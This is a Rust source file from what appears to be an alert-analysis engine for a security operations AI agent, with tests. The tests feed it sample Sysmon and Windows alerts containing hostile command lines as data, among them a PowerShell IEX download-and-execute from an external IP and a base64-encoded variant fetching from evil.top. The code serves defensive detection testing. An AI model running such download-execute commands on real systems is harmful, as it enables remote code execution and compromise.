//! One-shot deterministic analysis of a raw alert: fields, IOCs, ATT&CK
//! candidates, process / command-line findings, risk prior, matching
//! templates and investigation hints.
//!
//! `talon-agent` can run [`analyze_alert`] before the first model turn and
//! inject [`AlertAnalysis::to_prompt_block`] as a grounded prior. The block
//! quotes alert content (command lines, decoded payloads, indicators), so it
//! is **untrusted data** and must be fenced like any other SIEM content.

use std::fmt::Write as _;

use serde::Serialize;
use serde_json::Value;

use crate::alert::AlertFields;
use crate::cmdline::{self, CommandLineAnalysis, ProcessContext};
use crate::common::{Confidence, truncate_chars};
use crate::hints;
use crate::ioc::{ExtractOptions, IocExtractor, IocReport};
use crate::mitre::{self, MitreMapping, Tactic};
use crate::triage::{self, IocSummary, TriageContext, TriageInput, TriageScore};

/// Everything the engine derives from one alert.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct AlertAnalysis {
    /// Normalised alert fields.
    pub alert: AlertFields,
    /// Extracted indicators.
    pub iocs: IocReport,
    /// ATT&CK candidates.
    pub mitre: Vec<MitreMapping>,
    /// Process / command-line analysis (when the event has one).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub process: Option<CommandLineAnalysis>,
    /// Risk prior.
    pub triage: TriageScore,
    /// Matching prompt templates.
    pub templates: Vec<String>,
    /// Investigation hints.
    pub hints: Vec<String>,
}

/// Build the scoring input from derived artefacts. Only medium/high
/// confidence ATT&CK mappings (rule tags, field evidence, strong command-line
/// findings) contribute tactics; low-confidence event-id candidates do not.
pub fn triage_input(
    fields: &AlertFields,
    iocs: &IocReport,
    mappings: &[MitreMapping],
    process: Option<&CommandLineAnalysis>,
    ctx: &TriageContext,
) -> TriageInput {
    let mut tactics: Vec<Tactic> = mappings
        .iter()
        .filter(|m| m.confidence >= Confidence::Medium)
        .flat_map(|m| m.tactics.iter().copied())
        .chain(fields.mitre_tactics.iter().filter_map(|t| Tactic::parse(t)))
        .collect();
    tactics.sort();
    tactics.dedup();
    TriageInput {
        rule_level: fields.rule_level,
        rule_groups: fields.rule_groups.clone(),
        tactics,
        iocs: IocSummary::from_report(iocs),
        command_line_score: process.map(|p| p.score),
        command_line_findings: process
            .map(|p| p.findings.iter().map(|f| f.title.clone()).collect())
            .unwrap_or_default(),
        asset_criticality: ctx.asset_criticality,
        prior_sightings: ctx.prior_sightings,
        known_false_positive: ctx.known_false_positive,
        intel_verdict: ctx.intel_verdict,
    }
}

/// Analyse a raw alert document (any supported shape, see [`crate::alert`]).
pub fn analyze_alert(alert: &Value, ctx: &TriageContext) -> AlertAnalysis {
    let fields = AlertFields::from_json(alert);
    let mitre = mitre::map_alert(&fields);
    let process = (fields.command_line.is_some() || fields.image.is_some())
        .then(|| cmdline::analyze_process(&ProcessContext::from_fields(&fields)));
    // Indicators hidden in encoded payloads (`-EncodedCommand`, base64
    // literals) belong to the alert too.
    let mut extractor = IocExtractor::new(ExtractOptions::default());
    extractor.add_json(alert);
    if let Some(p) = &process {
        for d in &p.decoded {
            extractor.add_text(&d.text, Some("decoded(command_line)"));
        }
    }
    let iocs = extractor.finish();
    let triage = triage::score(&triage_input(&fields, &iocs, &mitre, process.as_ref(), ctx));
    let event = fields.effective_event_id();
    let templates = hints::template_candidates(
        &fields.rule_groups,
        event,
        fields.rule_description.as_deref(),
    );
    let hints = hints::investigation_hints(&fields.rule_groups, event);
    AlertAnalysis {
        alert: fields,
        iocs,
        mitre,
        process,
        triage,
        templates,
        hints,
    }
}

impl AlertAnalysis {
    /// Compact text block for the model's context (fence it: it quotes
    /// untrusted alert content).
    pub fn to_prompt_block(&self) -> String {
        let mut s = String::new();
        let a = &self.alert;
        let _ = writeln!(
            s,
            "Deterministic pre-analysis (talon-intel). Treat as a prior; verify against the raw event."
        );
        let _ = writeln!(
            s,
            "Risk prior: {}/100 ({}, {} confidence). {}",
            self.triage.score,
            self.triage.severity.label(),
            self.triage.confidence.as_str(),
            self.triage.rationale.join("; ")
        );
        let _ = writeln!(
            s,
            "Rule: {} level {} \"{}\" groups [{}]",
            a.rule_id.as_deref().unwrap_or("?"),
            a.rule_level
                .map(|l| l.to_string())
                .unwrap_or_else(|| "?".into()),
            truncate_chars(a.rule_description.as_deref().unwrap_or(""), 160),
            a.rule_groups.join(", ")
        );
        let _ = writeln!(
            s,
            "Host: {} | User: {} | Event id: {}",
            a.agent_name.as_deref().unwrap_or("?"),
            a.user
                .as_deref()
                .or(a.target_user.as_deref())
                .unwrap_or("?"),
            a.effective_event_id()
                .map(|e| e.to_string())
                .unwrap_or_else(|| "?".into())
        );
        if let Some(p) = &self.process {
            let _ = writeln!(
                s,
                "Process: {} -> {} | command-line score {} ({})",
                a.parent_image.as_deref().unwrap_or("?"),
                a.image.as_deref().unwrap_or("?"),
                p.score,
                p.verdict_hint()
            );
            for f in p.findings.iter().take(6) {
                let _ = writeln!(
                    s,
                    "  - [{}] {} ({})",
                    f.weight,
                    f.title,
                    truncate_chars(&f.evidence, 100)
                );
            }
            for d in p.decoded.iter().take(2) {
                let _ = writeln!(
                    s,
                    "  decoded ({}): {}",
                    d.method,
                    truncate_chars(&d.text, 300)
                );
            }
        }
        if !self.mitre.is_empty() {
            let items: Vec<String> = self
                .mitre
                .iter()
                .take(8)
                .map(|m| {
                    format!(
                        "{} {} [{}] ({})",
                        m.technique_id,
                        m.name.as_deref().unwrap_or("?"),
                        m.tactics
                            .iter()
                            .map(|t| t.name())
                            .collect::<Vec<_>>()
                            .join("/"),
                        m.confidence.as_str()
                    )
                })
                .collect();
            let _ = writeln!(s, "ATT&CK candidates: {}", items.join("; "));
        }
        let enrich: Vec<String> = self
            .iocs
            .enrichable()
            .take(15)
            .map(|i| format!("{} {}", i.ioc_type.as_str(), i.value))
            .collect();
        if !enrich.is_empty() {
            let _ = writeln!(s, "Enrichable IOCs: {}", enrich.join(", "));
        }
        let other = self.iocs.iocs.iter().filter(|i| !i.is_enrichable()).count();
        if other > 0 {
            let _ = writeln!(
                s,
                "Other indicators (internal / paths / registry / context): {other}"
            );
        }
        if !self.templates.is_empty() {
            let _ = writeln!(s, "Templates: {}", self.templates.join(", "));
        }
        if !self.hints.is_empty() {
            let _ = writeln!(s, "Hints:");
            for h in &self.hints {
                let _ = writeln!(s, "- {h}");
            }
        }
        s
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::Severity;
    use crate::triage::AssetCriticality;
    use serde_json::json;

    fn word_macro_alert() -> Value {
        json!({
            "_id": "AY9x1",
            "_source": {
                "timestamp": "2024-05-01T12:00:05.000+0000",
                "agent": {"id": "042", "name": "WS-042", "ip": "10.10.1.42"},
                "rule": {"id": "92057", "level": 12,
                         "description": "Powershell process spawned by Microsoft Office application",
                         "groups": ["sysmon", "sysmon_eid1_detections", "windows"],
                         "mitre": {"id": ["T1059.001", "T1204.002"], "tactic": ["Execution"]}},
                "data": {"win": {
                    "system": {"eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "WS-042.corp.local"},
                    "eventdata": {
                        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                        "commandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.4/a.ps1')\"",
                        "user": "CORP\\bob",
                        "hashes": "SHA256=8A6B0A2B4C3D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F708192A3B4C5D6E7,MD5=0123456789ABCDEF0123456789ABCDEF"
                    }}}
            }
        })
    }

    #[test]
    fn end_to_end_macro_dropper() {
        let a = analyze_alert(
            &word_macro_alert(),
            &TriageContext {
                asset_criticality: AssetCriticality::High,
                ..Default::default()
            },
        );
        assert_eq!(a.alert.rule_level, Some(12));
        assert!(
            a.iocs
                .find(crate::ioc::IocType::Ipv4, "185.220.101.4")
                .is_some()
        );
        assert!(
            a.iocs
                .find(crate::ioc::IocType::Ipv4, "10.10.1.42")
                .is_none()
        );
        let ids: Vec<&str> = a.mitre.iter().map(|m| m.technique_id.as_str()).collect();
        assert!(ids.contains(&"T1059.001"));
        assert!(ids.contains(&"T1204.002"));
        assert!(ids.contains(&"T1105"));
        let p = a.process.as_ref().map(|p| p.score).unwrap_or(0);
        assert!(p >= 80, "{p}");
        assert!(a.triage.score >= 80, "{:?}", a.triage);
        assert_eq!(a.triage.severity, Severity::Critical);
        assert_eq!(a.templates, vec!["sysmon_event_1.txt"]);
        let block = a.to_prompt_block();
        assert!(block.contains("Risk prior:"));
        assert!(block.contains("WINWORD.EXE -> "));
        assert!(block.contains("Enrichable IOCs: ipv4 185.220.101.4"));
        // IOCs from the decoded -EncodedCommand payload are included.
        let enc = json!({"rule": {"level": 10}, "data": {"win": {"eventdata": {
            "commandLine": "powershell -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AdABvAHAALwB4ACkA"}}}});
        let a = analyze_alert(&enc, &TriageContext::default());
        let url = a.iocs.find(crate::ioc::IocType::Url, "http://evil.top/x");
        assert!(
            url.is_some_and(|u| u.sources == vec!["decoded(command_line)".to_string()]),
            "{:?}",
            a.iocs
        );
        let combo = a
            .process
            .as_ref()
            .and_then(|p| p.findings.iter().find(|f| f.id == "download_execute"));
        assert!(combo.is_some_and(|f| !f.evidence.starts_with("[decoded]")));
        assert!(block.contains("Templates: sysmon_event_1.txt"));
    }

    #[test]
    fn benign_low_level_alert_stays_low() {
        let v = json!({
            "rule": {"id": "60106", "level": 3, "description": "Windows logon success", "groups": ["windows", "windows_security", "authentication_success"]},
            "agent": {"name": "DC01"},
            "data": {"win": {"system": {"eventID": "4624"}, "eventdata": {"targetUserName": "svc_backup", "ipAddress": "10.0.0.20"}}}
        });
        let a = analyze_alert(&v, &TriageContext::default());
        assert!(a.triage.score < 20, "{:?}", a.triage);
        assert_eq!(a.triage.severity, Severity::Informational);
        assert!(a.process.is_none());
        assert!(a.hints.iter().any(|h| h.contains("4624")));
    }

    #[test]
    fn low_confidence_candidates_do_not_add_tactics() {
        let v = json!({"rule": {"level": 5, "groups": ["sysmon"]},
                       "data": {"win": {"system": {"eventID": "22"}, "eventdata": {"queryName": "www.microsoft.com", "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}}}});
        let fields = AlertFields::from_json(&v);
        let maps = mitre::map_alert(&fields);
        assert!(
            maps.iter()
                .any(|m| m.technique_id == "T1071.004" && m.confidence == Confidence::Low)
        );
        let input = triage_input(
            &fields,
            &crate::ioc::extract_from_json(&v),
            &maps,
            None,
            &TriageContext::default(),
        );
        assert!(input.tactics.is_empty());
    }
    #[test]
    fn sysmon3_powershell_c2_connection() {
        let v = json!({
            "rule": {"id": "92101", "level": 10, "description": "PowerShell network connection to external host",
                     "groups": ["sysmon", "sysmon_eid3_detections"], "mitre": {"id": ["T1059.001"]}},
            "agent": {"name": "WS-007"},
            "data": {"win": {"system": {"eventID": "3"}, "eventdata": {
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "destinationIp": "45.33.32.156", "destinationPort": "4444", "protocol": "tcp",
                "sourceIp": "10.10.1.7", "initiated": "true"}}}
        });
        let a = analyze_alert(&v, &TriageContext::default());
        assert!(
            a.iocs
                .find(crate::ioc::IocType::Ipv4, "45.33.32.156")
                .is_some_and(|i| i.is_enrichable())
        );
        assert!(
            a.iocs
                .find(crate::ioc::IocType::Ipv4, "10.10.1.7")
                .is_some_and(|i| !i.is_enrichable())
        );
        assert!(a.mitre.iter().any(|m| m.technique_id == "T1071"));
        assert!(a.triage.score >= 55, "{:?}", a.triage);
        assert_eq!(a.templates, vec!["sysmon_event_3.txt"]);
        assert!(a.hints.iter().any(|h| h.contains("destinationPort")));
    }

    #[test]
    fn sysmon13_run_key_persistence() {
        let v = json!({
            "rule": {"id": "92302", "level": 12, "description": "Registry Run key value set",
                     "groups": ["sysmon", "sysmon_eid13_detections"]},
            "agent": {"name": "WS-008"},
            "data": {"win": {"system": {"eventID": "13"}, "eventdata": {
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "targetObject": "HKU\\S-1-5-21-111-222-333-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
                "details": "C:\\Users\\Public\\upd.exe"}}}
        });
        let a = analyze_alert(&v, &TriageContext::default());
        let run = a.mitre.iter().find(|m| m.technique_id == "T1547.001");
        assert!(
            run.is_some_and(|m| m.confidence == Confidence::High),
            "{:?}",
            a.mitre
        );
        assert!(a.triage.tactics_present());
        assert!(a.triage.score >= 70, "{:?}", a.triage);
        assert_eq!(a.iocs.of_type(crate::ioc::IocType::RegistryKey).count(), 1);
    }

    #[test]
    fn windows_brute_force() {
        let v = json!({
            "rule": {"id": "60204", "level": 10, "description": "Multiple Windows logon failures",
                     "groups": ["windows", "windows_security", "authentication_failures"],
                     "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]}},
            "agent": {"name": "DC01"},
            "data": {"win": {"system": {"eventID": "4625"}, "eventdata": {
                "targetUserName": "administrator", "ipAddress": "45.33.32.156", "logonType": "3"}}}
        });
        let a = analyze_alert(
            &v,
            &TriageContext {
                prior_sightings: 6,
                ..Default::default()
            },
        );
        assert_eq!(a.mitre[0].technique_id, "T1110");
        assert_eq!(a.alert.principal_user().as_deref(), Some("administrator"));
        assert!(a.triage.score >= 75, "{:?}", a.triage);
        assert!(a.hints.iter().any(|h| h.contains("0xC000006A")));
        assert!(a.templates.is_empty());
    }
}
